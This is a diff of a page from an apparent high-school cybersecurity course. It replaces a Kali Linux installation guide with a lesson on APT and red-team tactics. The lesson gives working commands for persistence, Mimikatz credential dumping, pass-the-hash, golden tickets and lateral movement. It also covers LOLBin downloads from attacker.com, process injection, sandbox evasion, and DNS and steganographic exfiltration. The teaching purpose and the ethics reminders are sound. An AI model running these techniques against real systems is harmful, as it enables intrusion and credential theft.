@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Linux Installation Process - NCHS Cybersecurity</title>
+    <title>Lesson 9.3 - NCHS Cybersecurity</title>
     
     
     <link rel="icon" href="../../../img/logo.png">
@@ -698,31 +698,31 @@
                                         <ul class="unit-lessons">
                                             
                                             <li>
-                                                <a href="../lesson1-1/">Lesson 1.1</a>
+                                                <a href="../../unit1/lesson1-1/">Lesson 1.1</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-2/">Lesson 1.2</a>
+                                                <a href="../../unit1/lesson1-2/">Lesson 1.2</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-3/">Lesson 1.3</a>
+                                                <a href="../../unit1/lesson1-3/">Lesson 1.3</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-4/">Lesson 1.4</a>
+                                                <a href="../../unit1/lesson1-4/">Lesson 1.4</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-5/">Lesson 1.5</a>
+                                                <a href="../../unit1/lesson1-5/">Lesson 1.5</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../lesson1-6/">Lesson 1.6</a>
+                                                <a href="../../unit1/lesson1-6/">Lesson 1.6</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="./">Linux Installation Process</a>
+                                                <a href="../../unit1/installation-process/">Linux Installation Process</a>
                                             </li>
                                             
                                         </ul>
@@ -878,15 +878,15 @@
                                         <ul class="unit-lessons">
                                             
                                             <li>
-                                                <a href="../../unit9/lesson9-1/">Lesson 9.1</a>
+                                                <a href="../lesson9-1/">Lesson 9.1</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../../unit9/lesson9-2/">Lesson 9.2</a>
+                                                <a href="../lesson9-2/">Lesson 9.2</a>
                                             </li>
                                             
                                             <li>
-                                                <a href="../../unit9/lesson9-3/">Lesson 9.3</a>
+                                                <a href="./">Lesson 9.3</a>
                                             </li>
                                             
                                         </ul>
@@ -964,142 +964,565 @@
 
     <div class="container">
         
-        <h2 id="what-is-it"><em>What</em> is it?</h2>
-<p>Kali is an operating system that was made <strong><em>specially</em></strong> for cybersecurity work (and hacking as well). It has a large toolkit of useful programs that we're going to learn about, including Hydra, Nmap, Wireshark, Tcpdump, MacChanger, Chisel, Aircrack-ng, etc.</p>
-<h2 id="some-vocab">Some Vocab:</h2>
-<p>As much as we know vocabulary might not be that interesting, it's important to know for the future, since there's a LOT of acronyms and words in cybersecurity that you're going to be hearing and using, so it's best to get used to it.</p>
-<ul>
-<li><strong>Operating System (OS)</strong>: The main software that runs your computer, like Windows, macOS, iOS, GNU/Linux, etc.</li>
-<li><strong>Virtual Machine (VM)</strong>: It's basically a computer <em>inside</em> another computer. You can run your regular OS, like Windows, and still have Kali Linux inside of it</li>
-<li><strong>ISO File (International Organization for Standardization File)</strong>: Sounds fancy, but really it's just a full copy of an OS within one tiny file</li>
-<li><strong>Hypervisor</strong>: Software that creates and manages VMs. Examples are VirtualBox and VMWare Workstation. There's also QEMU, but mostly Linux users use that, and you're likely running on Windows or mac</li>
-<li><strong>Bootable USB</strong>: Just a USB drive (which you hopefully already know about) that can start up a computer and install an OS (we don't need this yet)</li>
-<li><strong>Partitioning</strong>: A more advanced topic, but it's dividing up your drive into sections called <em>partitions</em>, which are like walls for a room. We don't need this yet, but it is good to know</li>
-</ul>
-<p>Now, let's get into the nitty-gritty:</p>
-<h2 id="method-1-easy-way">Method 1: Easy way :)</h2>
-<h3 id="minimum-requirements">Minimum Requirements*:</h3>
+        <h1 id="apt-tactics-and-red-team-operations">APT Tactics and Red Team Operations</h1>
+<p>Advanced Persistent Threats (APTs) and sophisticated red teams use tactics far beyond simple exploits. This lesson explores the methodologies, techniques, and tools used in advanced offensive operations.</p>
+<h2 id="the-kill-chain">The Kill Chain</h2>
+<h3 id="lockheed-martin-cyber-kill-chain">Lockheed Martin Cyber Kill Chain</h3>
+<p><strong>7 stages of attack:</strong></p>
 <ol>
-<li><code>8 GB</code> of RAM</li>
-<li><code>20-30 GB</code> of free hard drive space</li>
-<li>A decently fast CPU (you probably have this)</li>
+<li><strong>Reconnaissance</strong> - Research target</li>
+<li><strong>Weaponization</strong> - Create malicious payload</li>
+<li><strong>Delivery</strong> - Transmit weapon to target</li>
+<li><strong>Exploitation</strong> - Trigger vulnerability</li>
+<li><strong>Installation</strong> - Install backdoor</li>
+<li><strong>Command &amp; Control (C2)</strong> - Establish communication</li>
+<li><strong>Actions on Objectives</strong> - Achieve goal</li>
 </ol>
-<p>*But, how do I know if I meet them? Well, you can press <em><code>Ctrl+Shift+Esc</code></em> on Windows and click on <strong>"Performance"</strong> inside of Task Manager, and it'll give you a spec (specifications) sheet. On mac, you can click on <strong>"About"</strong> in the top menu bar of your computer. On Linux, you can type <strong><code>uname -a</code></strong>, or use a custom program like <code>fastfetch</code></p>
-<h2 id="big-disclaimer-for-windows-users">BIG DISCLAIMER FOR WINDOWS USERS:</h2>
-<ul>
-<li>You NEED to DISABLE something called Hyper-V. If you don't know what that is, for Windows users, Hyper-V will conflict with Virtualbox, making it run poorly and crash often</li>
-<li>To check if you hve Hyper-V, press <code>Win+R</code>, and type <code>optionalfeatures</code>, then press <code>Enter</code></li>
-<li>Look for a "Hyper-V" in the list of shown items. If it's checked, then it's enabled. Uncheck it.<ul>
-<li>Alternative method: go to cmd (Command Prompt), and right click and "Run as Administrator". Then use the following command: <code>bcdedit /set hypervisorlaunchtype off</code></li>
-</ul>
-</li>
-<li>Finally, restart your computer</li>
-</ul>
-<h2 id="big-disclaimer-for-macos-users">BIG DISCLAIMER FOR MACOS USERS:</h2>
-<ul>
-<li>You need to check if you're using an Intel-based Mac or Apple Silicon machine. If your device is M1, M2, M*, then it's <strong>Apple Silicon</strong></li>
-<li>If this is the case, you will need to use a different software for virtualization. You have some options, like <a href="https://getutm.app">UTM</a> or <a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion">VMware Fusion</a>. </li>
-<li>Also, you will have to install Kali Linux using the 
-<em><strong>ARM64 version! Not x86-64!</strong></em></li>
-</ul>
-<hr />
-<p>Now, go to <a href="https://virtualbox.org">virtualbox.org</a></p>
-<p>Click on the download for your OS, and install the program by following the instruction wizard.</p>
-<p><img alt="Virtual Box" src="../../../img/virtual_box.png" /></p>
-<ul>
-<li>Now, go to the <a href="https://kali.org/get-kali">Kali Linux website</a>.</li>
-<li>Download the "Installer" ISO file (<code>~ 4 GB</code> in size)</li>
-<li>Then choose the 64-bit version for modern computers.</li>
-<li>If your computer is old, it could be 32-bit. If so, you may need to check your system specifications as explained above. However, it probably isn't.</li>
-</ul>
-<p><img alt="Kali Installation" src="../../../img/kali_img.png" /></p>
-<blockquote>
-<p>Remember, Apple Silicon machines will install the ARM64 version of Kali Linux instead!</p>
-</blockquote>
-<ul>
-<li>Finally, make your Virtual Machine. Open up VirtualBox and click "New"</li>
-<li>Name it whatever, I'd call it "Kali Linux", or "Kali Machine".</li>
-<li>Type: Linux, Version: Debian (64-bit)</li>
-<li>Allocate at least <code>4 GB</code> of RAM, AKA <code>4096 MB</code>, by dragging the slider or typing in the number in the RAM text box</li>
-<li>Create a Virtual Hrd Disk (allocate <code>25-30 GB</code> minimum)<ul>
-<li>Choose VDI (VirtualBox Disk Image)</li>
-<li>Also select "dynamically allocated" to save space, and allows the VM to grow dynamically in storage size as you begin to add more things</li>
-</ul>
-</li>
-<li>After clicking done, tell it to create, but do NOT tell it to also start yet</li>
-<li>Click on your virtual machine, and then go to settings</li>
-<li>Then go to Storage, and click the empty disk icon</li>
-<li>This is where we "choose a disk file", and select the downloaded Kali ISO</li>
-<li>Then under System, enable PAE/NX if available to you. PAE is Physical Address Extension, and NX is No Execute. These allow for &gt; <code>4 GB</code> of RAM access and prevents non-executable code from being executed in memory segments. If you don't know what that means, just ignore this</li>
-<li>Under Display, increase video memory to <code>128 MB</code></li>
-<li>Finally, save and exit Settings, and click on Start to boot your VM</li>
-<li>Select "Graphical Install" (press Enter, navigate using arrow keys)</li>
-<li>Choose your language, location, keyboard (these can later be changed, doesn't really matter)</li>
-<li>You can set a hostname, or keep the default (kali)</li>
-</ul>
-<h3 id="important-username-is-kali-and-password-is-kali-by-default"><strong>IMPORTANT</strong>: username is <em>kali</em> and password is <em>kali</em> by default!</h3>
-<ul>
-<li>Choose "Guided - use entire disk" for your partitioning</li>
-<li>Then select "All files in one partition"</li>
-<li>Confirm and wait a while. Take a walk outside, take a short nap, whatever you want. Just wait 10-20 minutes and it'll be done</li>
-<li>Restart when prompted</li>
-<li>On first login, enter the username and password</li>
-<li>Then, click the <code>SUPER</code> key (<code>Win</code> key or <code>Cmd</code> key on mac) and type "terminal" or "console" into the search, and open the app</li>
-<li>In the terminal, you can type <code>sudo apt update &amp;&amp; sudo apt upgrade -y</code><ul>
-<li>This command just updates your system</li>
-<li>When prompted with a password, type in your password</li>
-</ul>
-</li>
-<li>Happy Linux!</li>
-</ul>
-<h2 id="method-2-hard-way-bare-metal-installation">Method 2: Hard way (bare metal installation)</h2>
-<p>Alright. You're ready for the real deal. No problem. </p>
-<p><code>WARNING! ⚠️⚠️</code>: This version of installation WILL take space on your disk! This means it will be physically installed, and it will NOT be installed as a VM! Just like Windows or macOS, it will be physically on your device. If you do this incorrectly, it may <strong>wipe your device completely</strong>. I'm not liable for if you mistakenly wipe your drive, it's up to you. Also, I personally do <strong>not recommend you install Kali Linux on a physical drive</strong>. If you want to use Linux for extra practice, install a distribution like <a href="https://www.debian.org/">Debian</a> or <a href="https://linuxmint.com/">Linux Mint</a>. You are risking data loss if done incorrectly, so proceed at your own risk.</p>
-<p>Important things to note are:</p>
-<ul>
-<li>If you install on bare metal, AKA on your physical device, your device may have incompatibility issues. I would recommend doing your own research before doing so</li>
-<li>You may want to install Linux on a secondary drive, since if you use your main one, you will have to create a special partition for Linux to use exclusively, which is more difficult</li>
-<li>You'll need a USB drive with preferably <code>8 GB</code> or more of storage</li>
-<li>You may need to adjust your BIOS (manufacturer specific, meaning it depends on what company made your computer and maybe even where you bought it from) to allow for other bootable devices, which can include removing Secure Boot</li>
-<li>There's some specifics for ARM64 machines like Apple Silicon that will be different!</li>
-<li>Overall, you are likely going to have to do your OWN research to make sure you don't mess anything up.</li>
-</ul>
-<p>Without further ado, these are some general instructions (not perfect):</p>
-<ol>
-<li>Create a bootable USB drive using an app like Balena Etcher or Rufus</li>
-<li>Make space on your hard drive by creating a disk partition of ~<code>30 GB</code> or more, or install on a secondary hard drive</li>
-<li>Boot from the USB drive from BIOS after restarting your computer and smashing the BIOS key as it boots up (typically <code>Esc</code>, <code>F11</code>, <code>F12</code>, or <code>Del</code> depending on the manufacturer)</li>
-<li>Follow the installation process, but make sure you select the right drive and if it's on the same disk as Windows or Mac, you install "alongside" it, not replace </li>
-<li>After going through the setup, you may re-enter the BIOS to change the boot order. What this means is move Linux above Windows so that on first boot you boot into Linux (optional)</li>
-</ol>
-<p>Some important extras:</p>
-<ul>
-<li>Make sure you regularly update your system at least weekly</li>
-<li>Make decent credentials or use a <a href="https://www.yubico.com/">physical key</a></li>
-<li>Never just copy/paste a command without understanding it, look it up at least (even from me!)</li>
-<li>Install packages wisely and preferably from trusted sources</li>
-</ul>
-<p>Happy Linux! :)</p>
+<p><strong>Defensive value:</strong> Break the chain at any point to stop attack.</p>
+<h3 id="mitre-attck-framework">MITRE ATT&amp;CK Framework</h3>
+<p><strong>Structured knowledge base of tactics and techniques.</strong></p>
+<p><strong>14 Tactics:</strong>
+1. Reconnaissance
+2. Resource Development
+3. Initial Access
+4. Execution
+5. Persistence
+6. Privilege Escalation
+7. Defense Evasion
+8. Credential Access
+9. Discovery
+10. Lateral Movement
+11. Collection
+12. Command and Control
+13. Exfiltration
+14. Impact</p>
+<p>Each tactic contains multiple techniques and sub-techniques.</p>
+<p><strong>Example - Persistence Techniques:</strong>
+- Boot or Logon Autostart Execution
+- Create Account
+- Scheduled Task/Job
+- Valid Accounts
+- Browser Extensions
+- Office Application Startup</p>
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="spear-phishing">Spear Phishing</h3>
+<p><strong>Targeted phishing against specific individuals.</strong></p>
+<p><strong>Components of successful spear phishing:</strong>
+- Reconnaissance (social media, LinkedIn, company site)
+- Personalization (reference specific projects, people)
+- Context (timing matters - before deadlines, holidays)
+- Credible sender (compromised account or spoofing)
+- Compelling action (urgency, authority, curiosity)</p>
+<p><strong>Example email:</strong></p>
+<pre><code>From: IT Support &lt;itsupport@company.com&gt;
+To: john.smith@company.com
+Subject: URGENT: Password Reset Required - Security Alert
+
+Hi John,
+
+We've detected suspicious login attempts on your account from 
+an IP address in Russia. For your security, please reset your 
+password immediately using this secure link:
+
+https://company-password-reset.com/reset?token=abc123
+
+This link expires in 2 hours. If you don't reset your password,
+your account will be locked.
+
+Thank you,
+IT Security Team
+</code></pre>
+<p><strong>Red flags defenders should catch:</strong>
+- Domain typosquatting (company vs company)
+- Unusual urgency
+- External link for password reset
+- Grammar/spelling errors
+- Sender address doesn't match display name</p>
+<h3 id="watering-hole-attacks">Watering Hole Attacks</h3>
+<p><strong>Compromise websites target visits.</strong></p>
+<p><strong>Process:</strong>
+1. Identify target organization
+2. Research where employees browse
+3. Compromise those websites
+4. Inject malware/exploit
+5. Wait for target to visit</p>
+<p><strong>Example:</strong>
+- Target: Defense contractor employees
+- Watering hole: Industry news site they all read
+- Payload: Browser exploit or malicious download</p>
+<h3 id="supply-chain-attacks">Supply Chain Attacks</h3>
+<p><strong>Compromise vendors to reach ultimate target.</strong></p>
+<p><strong>Types:</strong>
+- Software supply chain (malicious updates)
+- Hardware supply chain (backdoored components)
+- Service provider compromise (access to multiple clients)</p>
+<p><strong>Famous examples:</strong>
+- SolarWinds (Orion platform compromise)
+- CCleaner (malicious update)
+- ASUS Live Update (backdoored software)</p>
+<h2 id="persistence-mechanisms">Persistence Mechanisms</h2>
+<h3 id="registry-run-keys-windows">Registry Run Keys (Windows)</h3>
+<pre><code class="language-powershell"># Current user
+reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\malware.exe&quot;
+
+# All users (requires admin)
+reg add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\malware.exe&quot;
+</code></pre>
+<h3 id="scheduled-tasks">Scheduled Tasks</h3>
+<pre><code class="language-powershell"># Create scheduled task
+schtasks /create /tn &quot;Windows Update&quot; /tr &quot;C:\malware.exe&quot; /sc onlogon /ru SYSTEM
+
+# Or with XML for more control
+schtasks /create /tn &quot;Update&quot; /xml task.xml
+</code></pre>
+<h3 id="service-installation">Service Installation</h3>
+<pre><code class="language-powershell"># Create malicious service
+sc create &quot;WindowsUpdater&quot; binPath= &quot;C:\malware.exe&quot; start= auto
+
+# Start service
+sc start &quot;WindowsUpdater&quot;
+</code></pre>
+<h3 id="wmi-event-subscription">WMI Event Subscription</h3>
+<p><strong>Fileless persistence:</strong></p>
+<pre><code class="language-powershell"># Create event filter (trigger)
+$Filter = Set-WmiInstance -Class __EventFilter -Namespace &quot;root\subscription&quot; -Arguments @{
+    Name = &quot;UpdateFilter&quot;
+    EventNamespace = &quot;root\cimv2&quot;
+    QueryLanguage = &quot;WQL&quot;
+    Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'&quot;
+}
+
+# Create consumer (action)
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @{
+    Name = &quot;UpdateConsumer&quot;
+    CommandLineTemplate = &quot;powershell.exe -enc &lt;base64_payload&gt;&quot;
+}
+
+# Bind filter to consumer
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @{
+    Filter = $Filter
+    Consumer = $Consumer
+}
+</code></pre>
+<h3 id="linux-persistence">Linux Persistence</h3>
+<p><strong>Cron jobs:</strong></p>
+<pre><code class="language-bash"># User crontab
+echo &quot;@reboot /tmp/.hidden/backdoor.sh&quot; | crontab -
+
+# System-wide
+echo &quot;@reboot root /tmp/.hidden/backdoor.sh&quot; &gt;&gt; /etc/crontab
+</code></pre>
+<p><strong>Systemd service:</strong></p>
+<pre><code class="language-bash"># Create service file
+cat &gt; /etc/systemd/system/update.service &lt;&lt; EOF
+[Unit]
+Description=System Update Service
+
+[Service]
+Type=simple
+ExecStart=/tmp/.hidden/backdoor.sh
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Enable and start
+systemctl enable update.service
+systemctl start update.service
+</code></pre>
+<p><strong>SSH keys:</strong></p>
+<pre><code class="language-bash"># Add attacker's public key
+mkdir -p ~/.ssh
+echo &quot;ssh-rsa AAAA...&quot; &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+</code></pre>
+<h2 id="credential-access">Credential Access</h2>
+<h3 id="credential-dumping">Credential Dumping</h3>
+<p><strong>Mimikatz (Windows):</strong></p>
+<pre><code class="language-powershell"># Dump passwords from LSASS
+mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;
+
+# Dump cached credentials
+mimikatz.exe &quot;lsadump::cache&quot; &quot;exit&quot;
+
+# Dump SAM database
+mimikatz.exe &quot;lsadump::sam&quot; &quot;exit&quot;
+
+# Export tickets for pass-the-ticket
+mimikatz.exe &quot;sekurlsa::tickets /export&quot; &quot;exit&quot;
+</code></pre>
+<p><strong>Dumping /etc/shadow (Linux):</strong></p>
+<pre><code class="language-bash"># Read shadow file (requires root)
+cat /etc/shadow
+
+# Unshadow for cracking
+unshadow /etc/passwd /etc/shadow &gt; hashes.txt
+john hashes.txt
+</code></pre>
+<h3 id="pass-the-hash">Pass-the-Hash</h3>
+<p><strong>Use NTLM hash without cracking password.</strong></p>
+<pre><code class="language-bash"># Using pth-toolkit
+pth-winexe -U domain/user%hash //target cmd.exe
+
+# Using Impacket
+psexec.py -hashes :ntlm_hash user@target
+
+# Using CrackMapExec
+crackmapexec smb target -u user -H ntlm_hash
+</code></pre>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p><strong>Extract and crack service account passwords.</strong></p>
+<pre><code class="language-powershell"># Request service tickets
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;HTTP/server.domain.com&quot;
+
+# Export tickets
+Invoke-Mimikatz -Command '&quot;kerberos::list /export&quot;'
+
+# Offline cracking
+hashcat -m 13100 ticket.kirbi wordlist.txt
+</code></pre>
+<h3 id="golden-ticket-attack">Golden Ticket Attack</h3>
+<p><strong>Forge Kerberos tickets with compromised krbtgt hash.</strong></p>
+<pre><code class="language-powershell"># Get krbtgt hash (domain admin required)
+mimikatz.exe &quot;lsadump::dcsync /domain:company.com /user:krbtgt&quot;
+
+# Create golden ticket
+mimikatz.exe &quot;kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:hash /ptt&quot;
+
+# Now have domain admin access indefinitely
+</code></pre>
+<h2 id="lateral-movement">Lateral Movement</h2>
+<h3 id="pass-the-ticket">Pass-the-Ticket</h3>
+<pre><code class="language-powershell"># Export tickets
+mimikatz.exe &quot;sekurlsa::tickets /export&quot;
+
+# Import ticket
+mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot;
+
+# Access remote system
+dir \\server\c$
+</code></pre>
+<h3 id="psexec">PsExec</h3>
+<pre><code class="language-bash"># Using Sysinternals PsExec
+psexec.exe \\target -u domain\user -p password cmd.exe
+
+# Using Impacket
+psexec.py domain/user:password@target
+</code></pre>
+<h3 id="wmi-execution">WMI Execution</h3>
+<pre><code class="language-powershell"># Execute command remotely
+wmic /node:target /user:domain\user /password:pass process call create &quot;cmd.exe /c whoami&quot;
+
+# Using PowerShell
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c command&quot; -ComputerName target -Credential $cred
+</code></pre>
+<h3 id="ssh-lateral-movement">SSH Lateral Movement</h3>
+<pre><code class="language-bash"># Use compromised keys
+ssh -i stolen_key user@target
+
+# Port forwarding to reach internal systems
+ssh -L 3389:internal-server:3389 user@jump-host
+
+# Dynamic SOCKS proxy
+ssh -D 8080 user@target
+# Configure proxychains to use localhost:8080
+proxychains nmap 10.0.0.0/24
+</code></pre>
+<h2 id="command-and-control-c2">Command and Control (C2)</h2>
+<h3 id="c2-frameworks">C2 Frameworks</h3>
+<p><strong>Cobalt Strike:</strong>
+- Professional red team tool
+- Beacon payload (HTTP, DNS, SMB)
+- Malleable C2 profiles (customize traffic)
+- Post-exploitation modules</p>
+<p><strong>Metasploit:</strong>
+- Meterpreter payload
+- Multiple C2 protocols
+- Extensive post-exploitation</p>
+<p><strong>Empire/Starkiller:</strong>
+- PowerShell-based (Windows)
+- Python-based (Linux/Mac)
+- Modular architecture</p>
+<p><strong>Covenant:</strong>
+- .NET-based C2
+- Good for modern Windows</p>
+<h3 id="c2-communication-channels">C2 Communication Channels</h3>
+<p><strong>HTTP/HTTPS:</strong></p>
+<pre><code>Beacon → C2 Server
+GET /login.php HTTP/1.1
+Host: legitimate-looking-domain.com
+Cookie: session=&lt;encrypted_data&gt;
+</code></pre>
+<p><strong>DNS:</strong></p>
+<pre><code>Query: a8f3d2e1.command.attacker.com
+Response: IP address encodes command
+
+Query: 01b2c3d4.exfil.attacker.com (data exfiltration)
+</code></pre>
+<p><strong>Social Media:</strong>
+- Commands via Twitter/Facebook posts
+- Responses via comments
+- Steganography in images</p>
+<p><strong>Cloud Storage:</strong>
+- Commands in Dropbox files
+- Implant checks periodically
+- Legitimate traffic, hard to block</p>
+<h3 id="domain-fronting">Domain Fronting</h3>
+<p><strong>Hide C2 destination using CDN.</strong></p>
+<pre><code>SNI: legitimate-cdn.cloudfront.net
+Host header: attacker-controlled.cloudfront.net
+
+CDN routes to attacker server based on Host header,
+but TLS handshake shows legitimate domain.
+</code></pre>
+<h2 id="defense-evasion">Defense Evasion</h2>
+<h3 id="living-off-the-land-lolbins">Living Off the Land (LOLBins)</h3>
+<p><strong>Use legitimate Windows binaries for malicious purposes.</strong></p>
+<p><strong>Examples:</strong></p>
+<pre><code class="language-powershell"># Download file using certutil
+certutil.exe -urlcache -f http://attacker.com/malware.exe malware.exe
+
+# Execute script using regsvr32
+regsvr32.exe /s /n /u /i:http://attacker.com/evil.sct scrobj.dll
+
+# Download and execute using mshta
+mshta.exe http://attacker.com/payload.hta
+
+# Binary proxy execution using rundll32
+rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;document.write(&quot;&lt;script&gt;alert('code')&lt;/script&gt;&quot;)
+</code></pre>
+<h3 id="process-injection">Process Injection</h3>
+<p><strong>Hide malicious code in legitimate process.</strong></p>
+<p><strong>Techniques:</strong></p>
+<pre><code class="language-c">// Classic DLL injection
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
+WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath), NULL);
+HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, pDllPath, 0, NULL);
+</code></pre>
+<p><strong>Process hollowing:</strong>
+1. Create legitimate process in suspended state
+2. Hollow out (unmap) its memory
+3. Write malicious code
+4. Resume execution</p>
+<p><strong>Reflective DLL injection:</strong>
+- Load DLL without using LoadLibrary
+- Entirely in memory, no disk writes</p>
+<h3 id="obfuscation">Obfuscation</h3>
+<p><strong>PowerShell obfuscation:</strong></p>
+<pre><code class="language-powershell"># Original
+Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile malware.exe
+
+# Obfuscated
+$url='http://at'+'tacker.com/mal'+'ware.exe';
+$out='mal'+'ware.exe';
+.('I'+'nvoke-W'+'ebRequest') -Uri $url -OutFile $out
+
+# Base64 encoded
+powershell.exe -enc &lt;base64_encoded_command&gt;
+</code></pre>
+<p><strong>String encryption:</strong></p>
+<pre><code class="language-python"># Encrypt strings in malware
+from cryptography.fernet import Fernet
+
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+# Encrypt C2 domain
+c2_domain = &quot;attacker.com&quot;
+encrypted = cipher.encrypt(c2_domain.encode())
+
+# In malware: decrypt at runtime
+decrypted = cipher.decrypt(encrypted)
+</code></pre>
+<h3 id="anti-analysis">Anti-Analysis</h3>
+<p><strong>Detect VMs and sandboxes:</strong></p>
+<pre><code class="language-python">import os
+import subprocess
+
+def is_virtualized():
+    &quot;&quot;&quot;Check if running in VM&quot;&quot;&quot;
+
+    # Check for VM artifacts
+    vm_files = [
+        'C:\\Windows\\System32\\drivers\\vmmouse.sys',
+        'C:\\Windows\\System32\\drivers\\vmhgfs.sys',
+        '/dev/vmware'
+    ]
+
+    for f in vm_files:
+        if os.path.exists(f):
+            return True
+
+    # Check for sandbox behavior
+    if os.getenv('USERNAME') == 'sandbox':
+        return True
+
+    # Check uptime (sandboxes often have short uptime)
+    uptime = int(subprocess.check_output('echo $(($(date +%s) - $(date -d &quot;$(uptime -s)&quot; +%s)))', shell=True))
+    if uptime &lt; 600:  # Less than 10 minutes
+        return True
+
+    return False
+
+if is_virtualized():
+    # Act benign or exit
+    sys.exit(0)
+else:
+    # Execute malicious payload
+    run_payload()
+</code></pre>
+<h2 id="data-exfiltration">Data Exfiltration</h2>
+<h3 id="encrypted-channels">Encrypted Channels</h3>
+<pre><code class="language-python">import requests
+from cryptography.fernet import Fernet
+
+def exfiltrate_data(data, c2_url, key):
+    &quot;&quot;&quot;Exfiltrate encrypted data&quot;&quot;&quot;
+    cipher = Fernet(key)
+    encrypted = cipher.encrypt(data.encode())
+
+    # Send over HTTPS (legitimate-looking traffic)
+    response = requests.post(
+        c2_url,
+        data={'data': encrypted},
+        headers={'User-Agent': 'Mozilla/5.0...'}
+    )
+
+    return response.status_code == 200
+</code></pre>
+<h3 id="dns-tunneling">DNS Tunneling</h3>
+<pre><code class="language-python">import dns.resolver
+import base64
+
+def exfil_via_dns(data, domain):
+    &quot;&quot;&quot;Exfiltrate data via DNS queries&quot;&quot;&quot;
+    # Encode and chunk data
+    encoded = base64.b32encode(data.encode()).decode()
+    chunk_size = 63  # DNS label max length
+
+    for i in range(0, len(encoded), chunk_size):
+        chunk = encoded[i:i+chunk_size]
+        query = f&quot;{chunk}.{domain}&quot;
+
+        try:
+            dns.resolver.resolve(query, 'A')
+        except:
+            pass  # Don't care about response
+</code></pre>
+<h3 id="steganography">Steganography</h3>
+<pre><code class="language-python">from PIL import Image
+
+def hide_data_in_image(image_path, data, output_path):
+    &quot;&quot;&quot;Hide data in image LSB&quot;&quot;&quot;
+    img = Image.open(image_path)
+    encoded = img.copy()
+    pixels = encoded.load()
+
+    # Convert data to binary
+    binary_data = ''.join(format(ord(c), '08b') for c in data)
+    binary_data += '1111111111111110'  # End marker
+
+    data_index = 0
+    for y in range(img.size[1]):
+        for x in range(img.size[0]):
+            if data_index &lt; len(binary_data):
+                pixel = list(pixels[x, y])
+                # Modify LSB of red channel
+                pixel[0] = (pixel[0] &amp; 0xFE) | int(binary_data[data_index])
+                pixels[x, y] = tuple(pixel)
+                data_index += 1
+            else:
+                break
+
+    encoded.save(output_path)
+
+# Use: Upload image to social media, C2 extracts data
+</code></pre>
+<h2 id="red-team-operations">Red Team Operations</h2>
+<h3 id="operational-security-opsec">Operational Security (OPSEC)</h3>
+<p><strong>Principles:</strong>
+- Minimize footprint
+- Blend in with normal traffic
+- Rotate infrastructure
+- Use legitimate services
+- Clean up artifacts</p>
+<p><strong>Tradecraft:</strong>
+- Use encryption for all communications
+- Separate testing and operational infrastructure
+- Document everything (for report)
+- Time operations appropriately
+- Have rollback plans</p>
+<h3 id="rules-of-engagement">Rules of Engagement</h3>
+<p><strong>Typical ROE includes:</strong>
+- Authorized scope (IP ranges, domains)
+- Prohibited actions (DoS, data destruction)
+- Time windows for testing
+- Escalation procedures
+- Communication protocols
+- Data handling requirements</p>
+<h3 id="post-engagement">Post-Engagement</h3>
+<p><strong>Cleanup:</strong>
+- Remove backdoors
+- Delete implants
+- Clean logs (carefully, document first)
+- Remove accounts created
+- Close network connections</p>
+<p><strong>Reporting:</strong>
+- Executive summary
+- Technical findings
+- Evidence (screenshots, logs)
+- Risk ratings
+- Remediation recommendations
+- Timeline of activities</p>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<p><strong>APT characteristics:</strong>
+- Long-term, patient operations
+- Sophisticated techniques
+- Well-resourced
+- Clear objectives
+- Custom tooling</p>
+<p><strong>Defensive lessons:</strong>
+- Assume breach mentality
+- Defense in depth essential
+- Monitor for TTPs, not just IOCs
+- Threat intelligence crucial
+- Continuous improvement</p>
+<p><strong>Ethical considerations:</strong>
+- Always authorized testing only
+- Respect scope limitations
+- Document everything
+- Report responsibly
+- Clean up completely</p>
+<p><strong>Remember:</strong>
+- These techniques are powerful
+- Use only with authorization
+- Legal consequences for misuse
+- Ethics matter
+- Skills should protect, not harm</p>
+<p>APT tactics represent the cutting edge of offensive security. Study them to better defend against real threats, practice in legal environments, and always use your skills ethically and responsibly.</p>
         
 
         <!-- Lesson Navigation (only show on non-homepage pages) -->
         
         <div class="lesson-nav">
             
-            <a href="../lesson1-6/" class="lesson-nav-button">
+            <a href="../lesson9-2/" class="lesson-nav-button">
                 <span class="arrow">←</span>
-                <span>Previous: Lesson 1.6</span>
+                <span>Previous: Lesson 9.2</span>
             </a>
             
 
             <div class="lesson-nav-info">
